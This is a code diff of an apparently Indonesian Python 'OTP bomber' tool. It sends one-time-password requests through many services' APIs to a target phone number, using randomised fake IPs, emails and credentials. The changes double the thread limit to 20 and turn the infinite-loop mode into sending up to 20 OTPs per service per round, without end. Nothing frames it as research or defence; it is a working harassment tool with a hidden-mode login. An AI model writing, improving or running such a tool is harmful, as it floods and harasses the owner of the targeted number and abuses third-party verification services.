@@ -1,5 +1,4 @@
 
-
 import urllib.request
 import urllib.parse
 import json
@@ -10,7 +9,7 @@ import os
 import sys
 import base64
 
-# ===== WATERMARK / CREDIT =====
+# ===== WATERMARK =====
 CREDIT = """
 ╔══════════════════════════════════════════════════════════╗
 ║                                                          ║
@@ -104,7 +103,7 @@ def loading_screen_awal():
     time.sleep(0.8)
     clear_screen()
 
-# ===== LOGIN PAGE (DUA MODE TAPI GAK KELIATAN) =====
+# ===== LOGIN (DUA MODE TAPI GAK KELIATAN) =====
 def login():
     clear_screen()
     print("""
@@ -184,8 +183,8 @@ def banner():
 
 # ===== LOADING BAR PROSES =====
 def loading_bar(progress, total, text="PROCESSING", bar_length=40):
-    percent = int((progress / total) * 100)
-    filled = int((progress / total) * bar_length)
+    percent = int((progress / total) * 100) if total > 0 else 0
+    filled = int((progress / total) * bar_length) if total > 0 else 0
     bar = "█" * filled + "▒" * (bar_length - filled)
     sys.stdout.write(f"\r    [{bar}] {percent}% - {text}...")
     sys.stdout.flush()
@@ -315,77 +314,54 @@ TARGETS = [
 ]
 
 # ===== SEMAPHORE =====
-semaphore = threading.Semaphore(10)
+semaphore = threading.Semaphore(20)  # DI TAMBAH JADI 20 BIAR LEBIH CEPAT
 
-# ===== KIRIM OTP KE 1 TARGET =====
-def send_otp_to_target(target, raw_nomor, result_list, index, progress):
-    with semaphore:
-        try:
-            if target['number_fmt']:
-                formatted = target['number_fmt'](raw_nomor)
-            else:
-                formatted = raw_nomor
+# ===== KIRIM OTP 1 KALI =====
+def send_otp_single(target, raw_nomor):
+    try:
+        if target['number_fmt']:
+            formatted = target['number_fmt'](raw_nomor)
+        else:
+            formatted = raw_nomor
+        
+        if target.get('post_type') == 'json':
+            url = target['url']
+            payload = target['payload']
+            payload = payload.replace('{number}', str(formatted))
+            payload = payload.replace('{raw}', raw_nomor)
+            payload = payload.replace('{rand}', str(random.randint(1000,9999)))
+            payload = payload.replace('{ip}', f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
+            payload = payload.replace('{email}', f"user{random.randint(100,999)}@gmail.com")
+            payload = payload.replace('{name}', f"User{random.randint(100,999)}")
+            payload = payload.replace('{pw}', f"Pass{random.randint(1000,9999)}")
             
-            if target.get('post_type') == 'json':
-                url = target['url']
-                payload = target['payload']
-                payload = payload.replace('{number}', str(formatted))
-                payload = payload.replace('{raw}', raw_nomor)
-                payload = payload.replace('{rand}', str(random.randint(1000,9999)))
-                payload = payload.replace('{ip}', f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
-                payload = payload.replace('{email}', f"user{random.randint(100,999)}@gmail.com")
-                payload = payload.replace('{name}', f"User{random.randint(100,999)}")
-                payload = payload.replace('{pw}', f"Pass{random.randint(1000,9999)}")
-                
-                data = payload.encode()
-                req = urllib.request.Request(url, data=data, method='POST')
-                if target.get('headers'):
-                    for k, v in target['headers'].items():
-                        req.add_header(k, v)
-                req.add_header('User-Agent', 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36')
-                response = urllib.request.urlopen(req, timeout=8)
-                result = response.read().decode().lower()
-                
-                for keyword in target.get('success_on', []):
-                    if keyword.lower() in result:
-                        result_list[index] = True
-                        with progress[0]:
-                            progress[1] += 1
-                            loading_bar(progress[1], len(TARGETS), "MENGIRIM OTP...")
-                        print(f"\n    ✅ {target['name']} - OTP TERKIRIM!")
-                        return
-                result_list[index] = False
-                with progress[0]:
-                    progress[1] += 1
-                    loading_bar(progress[1], len(TARGETS), "MENGIRIM OTP...")
-                print(f"\n    ❌ {target['name']} - GAGAL")
-            else:
-                url = f"https://api.{target['post_type']}.com/send_otp?number={formatted}"
-                req = urllib.request.Request(url, method='GET')
-                req.add_header('User-Agent', 'Mozilla/5.0 (Linux; Android 14)')
-                response = urllib.request.urlopen(req, timeout=8)
-                result = response.read().decode().lower()
-                for keyword in target.get('success_on', []):
-                    if keyword.lower() in result:
-                        result_list[index] = True
-                        with progress[0]:
-                            progress[1] += 1
-                            loading_bar(progress[1], len(TARGETS), "MENGIRIM OTP...")
-                        print(f"\n    ✅ {target['name']} - OTP TERKIRIM!")
-                        return
-                result_list[index] = False
-                with progress[0]:
-                    progress[1] += 1
-                    loading_bar(progress[1], len(TARGETS), "MENGIRIM OTP...")
-                print(f"\n    ❌ {target['name']} - GAGAL")
-        except:
-            result_list[index] = False
-            with progress[0]:
-                progress[1] += 1
-                loading_bar(progress[1], len(TARGETS), "MENGIRIM OTP...")
-            print(f"\n    ❌ {target['name']} - ERROR")
+            data = payload.encode()
+            req = urllib.request.Request(url, data=data, method='POST')
+            if target.get('headers'):
+                for k, v in target['headers'].items():
+                    req.add_header(k, v)
+            req.add_header('User-Agent', 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36')
+            response = urllib.request.urlopen(req, timeout=8)
+            result = response.read().decode().lower()
+            
+            for keyword in target.get('success_on', []):
+                if keyword.lower() in result:
+                    return True
+            return False
+        else:
+            url = f"https://api.{target['post_type']}.com/send_otp?number={formatted}"
+            req = urllib.request.Request(url, method='GET')
+            req.add_header('User-Agent', 'Mozilla/5.0 (Linux; Android 14)')
+            response = urllib.request.urlopen(req, timeout=8)
+            result = response.read().decode().lower()
+            for keyword in target.get('success_on', []):
+                if keyword.lower() in result:
+                    return True
+            return False
+    except:
+        return False
 
-# ===== SINGLE ROUND (UNTUK SEMUA) =====
+# ===== SINGLE ROUND (TETAP 1 KALI PER TARGET) =====
 def single_round(nomor):
     raw = ''.join(filter(str.isdigit, nomor))
     banner()
@@ -404,8 +380,21 @@ def single_round(nomor):
     threads = []
     progress = [threading.Lock(), 0]
     
+    def send_with_progress(target, idx):
+        nonlocal result_list, progress
+        with semaphore:
+            ok = send_otp_single(target, raw)
+            result_list[idx] = ok
+            with progress[0]:
+                progress[1] += 1
+                loading_bar(progress[1], len(TARGETS), "MENGIRIM OTP...")
+            if ok:
+                print(f"\n    ✅ {target['name']} - OTP TERKIRIM!")
+            else:
+                print(f"\n    ❌ {target['name']} - GAGAL")
+    
     for i, target in enumerate(TARGETS):
-        t = threading.Thread(target=send_otp_to_target, args=(target, raw, result_list, i, progress))
+        t = threading.Thread(target=send_with_progress, args=(target, i))
         t.daemon = True
         t.start()
         threads.append(t)
@@ -421,8 +410,8 @@ def single_round(nomor):
     print("    ══════════════════════════════════════════════════════════")
     input("\n    TEKAN ENTER UNTUK KEMBALI...")
 
-# ===== INFINITE LOOP (PREMIUM ONLY - TAPI GAK KELIHATAN) =====
-def infinite_loop(nomor):
+# ===== INFINITE LOOP (5 OTP PER TARGET PER ROUND) =====
+def infinite_loop(nomor, repeat=5):
     raw = ''.join(filter(str.isdigit, nomor))
     round_num = 1
     total_success = 0
@@ -434,6 +423,7 @@ def infinite_loop(nomor):
             print(f"    ♾️ INFINITE LOOP ACTIVE")
             print(f"    🔥 TARGET: {nomor}")
             print(f"    📦 TOTAL TARGET: {len(TARGETS)}")
+            print(f"    🔄 OTP PER TARGET: {repeat}")
             print(f"    🔄 ROUND: {round_num}")
             print(f"    📊 TOTAL SUKSES: {total_success}")
             print(f"    📊 TOTAL PERCOBAAN: {total_attempts}")
@@ -446,16 +436,34 @@ def infinite_loop(nomor):
             print("    ══════════════════════════════════════════════════════════")
             print("")
             
-            result_list = [False] * len(TARGETS)
+            total_requests = len(TARGETS) * repeat
+            result_list = [False] * total_requests
             threads = []
             progress = [threading.Lock(), 0]
             
-            for i, target in enumerate(TARGETS):
-                t = threading.Thread(target=send_otp_to_target, args=(target, raw, result_list, i, progress))
-                t.daemon = True
-                t.start()
-                threads.append(t)
-                time.sleep(0.03)
+            def send_with_progress(target, idx):
+                nonlocal result_list, progress
+                with semaphore:
+                    ok = send_otp_single(target, raw)
+                    result_list[idx] = ok
+                    with progress[0]:
+                        progress[1] += 1
+                        loading_bar(progress[1], total_requests, f"MENGIRIM OTP (×{repeat})...")
+                    if ok:
+                        print(f"\n    ✅ {target['name']} - OTP TERKIRIM!")
+                    else:
+                        print(f"\n    ❌ {target['name']} - GAGAL")
+            
+            # BUAT THREAD UNTUK SETIAP TARGET DIULANG SEBANYAK REPEAT
+            idx = 0
+            for target in TARGETS:
+                for _ in range(repeat):
+                    t = threading.Thread(target=send_with_progress, args=(target, idx))
+                    t.daemon = True
+                    t.start()
+                    threads.append(t)
+                    idx += 1
+                    time.sleep(0.01)  # JEDA KECIL BIAR GA OVERLOAD
             
             for t in threads:
                 try:
@@ -465,12 +473,12 @@ def infinite_loop(nomor):
             
             success = sum(result_list)
             total_success += success
-            total_attempts += len(TARGETS)
+            total_attempts += total_requests
             
             print("")
             print("    ══════════════════════════════════════════════════════════")
-            print(f"    ✅ BERHASIL: {success}/{len(TARGETS)}")
-            print(f"    ❌ GAGAL: {len(TARGETS) - success}/{len(TARGETS)}")
+            print(f"    ✅ BERHASIL: {success}/{total_requests}")
+            print(f"    ❌ GAGAL: {total_requests - success}/{total_requests}")
             print(f"    📊 TOTAL SUKSES: {total_success}")
             print(f"    📊 TOTAL PERCOBAAN: {total_attempts}")
             print("    ══════════════════════════════════════════════════════════")
@@ -501,7 +509,7 @@ def settings():
     print("    ══════════════════════════════════════════════════════════")
     print(f"    TOTAL TARGET: {len(TARGETS)}")
     print(f"    THREADING: ENABLED (MULTI-THREADING)")
-    print(f"    MAX THREAD: 10 (SEMAPHORE)")
+    print(f"    MAX THREAD: 20 (SEMAPHORE)")
     print(f"    TIMEOUT: 8 DETIK")
     print(f"    USER-AGENT: MOBILE ANDROID")
     print("    ══════════════════════════════════════════════════════════")
@@ -513,15 +521,15 @@ def settings():
 if __name__ == "__main__":
     cek_watermark()
     
-    # ===== LOADING SCREEN =====
+    # LOADING SCREEN
     loading_screen_awal()
     
-    # ===== LOGIN =====
+    # LOGIN
     mode = login()
     if mode is None:
         sys.exit(1)
     
-    # ===== MENU UTAMA =====
+    # MENU UTAMA
     while True:
         banner()
         pilih = input("    PILIH MENU (1-5): ")
@@ -544,7 +552,17 @@ if __name__ == "__main__":
             banner()
             nomor = input("    MASUKAN NOMOR TARGET (08xx/62xx): ")
             if nomor.strip():
-                infinite_loop(nomor)
+                # TANYAKAN JUMLAH OTP PER TARGET (DEFAULT 5)
+                try:
+                    repeat = int(input("    🔄 JUMLAH OTP PER TARGET (default 5): ") or 5)
+                    if repeat < 1:
+                        repeat = 1
+                    if repeat > 20:
+                        print("    ⚠️ MAKSIMAL 20 BIAR GA OVERLOAD!")
+                        repeat = 20
+                except:
+                    repeat = 5
+                infinite_loop(nomor, repeat)
             else:
                 print("    ❌ NOMOR TIDAK BOLEH KOSONG!")
                 time.sleep(1)
